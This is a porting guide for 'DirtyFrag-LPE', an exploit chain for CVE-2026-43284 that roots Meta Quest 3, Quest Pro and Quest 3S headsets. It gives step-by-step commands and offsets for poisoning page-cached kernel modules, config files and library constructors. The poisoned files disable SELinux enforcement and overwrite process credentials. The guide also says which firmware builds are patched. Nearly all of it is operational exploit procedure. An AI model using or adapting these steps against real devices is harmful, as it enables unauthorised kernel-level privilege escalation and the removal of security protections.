# Porting DirtyFrag-LPE to a new firmware (Quest 3 or Quest Pro)

> **Patched builds:** DirtyFrag (CVE-2026-43284) is fixed at security patch level `2026-06-04`
> (see [README.md](README.md)). `port.py` will still *build a target* from a patched OTA — all the
> offsets extract fine and the kernel layout looks unchanged — but the **primitive itself is dead**,
> so the chain won't complete. Offline porting is therefore **not** sufficient to prove a build
> vulnerable: always confirm the page-cache write actually lands on-device (poison a scratch file in
> `/data/local/tmp`, read it back — if it's unchanged while `/proc/net/xfrm_stat`'s
> `XfrmInStateProtoError` still climbs, the build is patched). `targets/q3_52433670048800520.json` is
> kept as a worked example of a patched target (`"status":"PATCHED"`).

A target is one `targets/<name>.json` + the gathered binaries in `targets/<name>/`. Everything
version- and device-specific lives in that JSON; the `kernel.merged` flag selects the flow, so the
**same orchestrator runs Quest 3 and Quest Pro**. See the Quest Pro section below for the merged
shape. The rest of this file describes the Quest 3 two-carrier flow (carrier `llcc_perfmon.ko` +
cred carrier `usbip-vudc.ko` + `init.insmod.cfg`).

You need **only the exact-build firmware zip** `q3_<build>.zip` — everything (carrier `.ko`, cfg,
kernel→DELTA, libeva/libgralloc + libandroid_servers offsets) is extracted from it. **No device is
required.** A connected `--device` is optional and just skips the 1.2 GB `system` dump (it adb-pulls
`libandroid_servers` instead). Tools: `payload-dumper-go`, `debugfs`, `vmlinux-to-elf`,
`llvm-readelf`/`llvm-nm` (all tool paths live in `toolconf.py` — edit there or set env vars).

The **target name defaults to the zip basename** (`QPro_<build>`, `q3_<build>`) — the naming scheme
used in `targets/`. Override with `--name` if needed.

---

## Automated (recommended)

```
python3 port.py --zip /path/q3_<build>.zip                    # Quest 3 (OTA-only)
```

This extracts boot/vendor/vendor_dlkm(/system when no device), pulls both carriers
(`llcc_perfmon.ko` + `usbip-vudc.ko`) + cfg, runs vmlinux-to-elf to compute the four
**anchor-relative deltas** (`selinux_state`, `find_vpid`, `pid_task`,
`selinux_status_update_setenforce`, all minus `__platform_driver_register`), derives
libeva/libandroid offsets (from `system.img`/vendor, or the device) and the libeva code gap,
reads `build_incremental` from `system.img` build.prop (or the device), then writes
`targets/<zip-basename>.json` + copies the binaries. It removes its multi-GB scratch on exit.

**Verify the draft** before use:
- `kernel.anchor_symbol` = `__platform_driver_register` (the CALL26 inside both carriers' init); the
  four `delta_*_from_anchor` are `<symbol> - __platform_driver_register` (32-bit two's complement).
- `cred_carrier` = a NOT-loaded module with a ≥~180 B `.init.text` and that anchor, whose deps are
  loaded. `usbip-vudc` (408 B init, dep `usbip-core` loaded) works on both Quest builds so far;
  `port.py` warns if it lacks the anchor.
- `cfg.inject_off`/`inject_len` must span whole cfg lines, be ≥ the insmod line, and end **>17 B
  before EOF** (sendfile can't send 17 B past EOF). `0x21`/`54` fits the standard 268-B cfg.
- `libeva.stub_gap_*` is a zero run in an executable segment (≥ ~1.7 KB).

Then run: `fuguquest -t targets/quest3-<short>.json`.

---

## Manual (what `port.py` automates)

```bash
# 1. extract partitions from the exact-build zip
unzip -o q3_<build>.zip payload.bin
payload-dumper-go -p boot,vendor,vendor_dlkm -o out payload.bin

# 2. carriers + cfg  (must be byte-exact to the device -> from the exact build)
debugfs -R "dump /lib/modules/llcc_perfmon.ko targets/<name>/llcc_perfmon.ko" out/vendor_dlkm.img
debugfs -R "dump /lib/modules/usbip-vudc.ko   targets/<name>/usbip-vudc.ko"   out/vendor_dlkm.img
debugfs -R "dump /etc/init.insmod.cfg         targets/<name>/init.insmod.cfg" out/vendor.img
strings -a targets/<name>/llcc_perfmon.ko | grep vermagic        # must == device `cat /proc/version`

# 3. anchor-relative DELTAS from the kernel (all minus __platform_driver_register, KASLR-invariant)
vmlinux-to-elf out/boot.img vmlinux.elf
llvm-nm vmlinux.elf | grep -wE 'selinux_state|__platform_driver_register|find_vpid|pid_task|selinux_status_update_setenforce'
#   delta_selinux_from_anchor  = selinux_state                     - __platform_driver_register
#   delta_findvpid_from_anchor = find_vpid                         - __platform_driver_register
#   delta_pidtask_from_anchor  = pid_task                          - __platform_driver_register
#   delta_ssuse_from_anchor    = selinux_status_update_setenforce  - __platform_driver_register
#   (store each as 32-bit two's complement hex; negatives are fine, cred_patch.S sxtw's them)
llvm-readelf -r targets/<name>/llcc_perfmon.ko    # confirm '.rela.init.text' CALL26 = __platform_driver_register

# 4. libeva / libandroid offsets  (pull the device's own, shell-readable)
adb pull /vendor/lib64/libeva.so ; adb pull /system/lib64/libandroid_servers.so
llvm-readelf -S libeva.so | grep init_array          # -> init_array_off
#   orig_ctor_off = *(u64*)(libeva + init_array_off)   (first ctor)
#   stub_gap_off/size = a >=1.7KB zero run in an executable (r-x) PT_LOAD segment
llvm-readelf -sW libandroid_servers.so | grep NativeInputManager4dumpE   # -> dump_off/size
```

Fill `targets/<name>.json` (copy an existing one as a template). Confirm the device permits the
finit trigger: `adb shell setprop ctl.start insmod_sh` (should be allowed for `shell`).

> Note: across the builds seen so far the **userspace libs are identical** (only the kernel
> changes), so `libeva`/`libandroid`/`cfg`/carrier-layout values carried over unchanged between
> 5234532 and 5243367 — only `vermagic` and `delta_selinux_from_anchor` differed. Still verify.

---

## Quest Pro (merged single-carrier)

Quest Pro's 4.19 kernel needs a different shape, all target-driven (`kernel.merged: true`):

- **struct offsets differ** — `selinux_state.enforcing @ +1` (byte 0 is `disabled`), `task_struct.cred
  @ 0x7e8`. Confirm both from the device's BTF:
  `adb shell su -c 'cat /sys/kernel/btf/vmlinux' > btf.bin && pahole -C selinux_state btf.bin` and
  `pahole -C task_struct btf.bin | grep -w cred`. Set `kernel.enforcing_off` / `kernel.cred_off`.
- **one merged carrier** — the only not-loaded module with a big-enough init is `rdbg` (680 B);
  `llcc_perfmon` is already loaded and the USB-net modules are too small for the 196 B cred-patch. So
  `build_credmod` diff-patches `rdbg` into enforcing=0 + status-sync + cred-patch and it loads once.
  `rdbg`'s init CALL26 anchor is `__platform_driver_register` (same as Q3).
- **1-file ctor injection** — `rdbg` is `vendor_file` (shell can't read it under Enforcing), so it's
  poisoned by an `init_array` ctor injected into `libgralloc.qti.so` (a `same_process_hal_file` lib
  mapped by `trackingservice`, RELR init_array, ~3.7 KB exec gap). The cfg **is** shell-readable under
  Enforcing on QPro, so shell poisons it directly (no 2nd table in the ctor — the 243-entry carrier
  table alone nearly fills the gap).

```
python3 port.py --zip QPro_<build>.zip --name questpro-<short> --merged \
  --carrier rdbg --inject-lib libgralloc.qti.so --enforcing-off 1 --cred-off 0x7e8 --device <SERIAL>
fuguquest -t targets/questpro-<short>.json --postex
```

`port.py --merged` extracts `rdbg` + cfg (QPro keeps modules in `vendor.img:/lib/modules`), computes
the four anchor-relative deltas, derives `libgralloc.qti` init_array/ctor/gap and the
`libandroid_servers::dump` offset, and emits the merged JSON (no `cred_carrier`, adds
`cfg.shell_poison_under_enforcing`). `libandroid_servers` lives in `system` — pass `--device` so it's
pulled via adb (QPro's `system` isn't a standalone payload partition).

**Verify on first run** (static-derived, not yet run on hardware): `module.sig_enforce` off,
`libgralloc.qti.so` shell-readable, `dumpsys input` restarts `trackingservice`, and the injection
stub still fits the lib's gap (`build_inject_stub` errors if not — pick a lib with a bigger gap, e.g.
`libcdsprpc.so`, listed in the target as `inject_lib`).

---

## Quest 3S (merged 5.10 via .text-splice)

Q3S is the Q3 5.10 chain but **has no `usbip-vudc`**, and its only not-loaded patchable module is
`llcc_perfmon` whose `.init.text` is 52 B. So it uses a merged single carrier where the cred+enforcing
patch goes in llcc's large `.text` (build_credmod auto-detects the small `.init.text` and does the
`.text`-splice: repoints `module->init`, plants the ABS64 anchor via a repurposed `.text` reloc).
The 5.10 cfg isn't shell-readable under Enforcing, so the ctor poisons it too (`--cfg-ctor`), and
`libeva`'s gap is too small for the merged carrier — use `libcdsprpc` (bigger gap).

```
python3 port.py --zip q3s_<build>.zip --merged --carrier llcc_perfmon \
  --inject-lib libcdsprpc.so --cfg-ctor
fuguquest -t targets/q3s_<build>.json --adb-root          # or --postex
```

Confirm on-device (as with QPro's gralloc injection): `trackingservice` maps `libcdsprpc` and it's
`same_process_hal_file` (shell-readable). If not, pick another trackingservice-mapped, shell-readable
lib with a ≥ ~3.7 KB exec gap for `--inject-lib`.
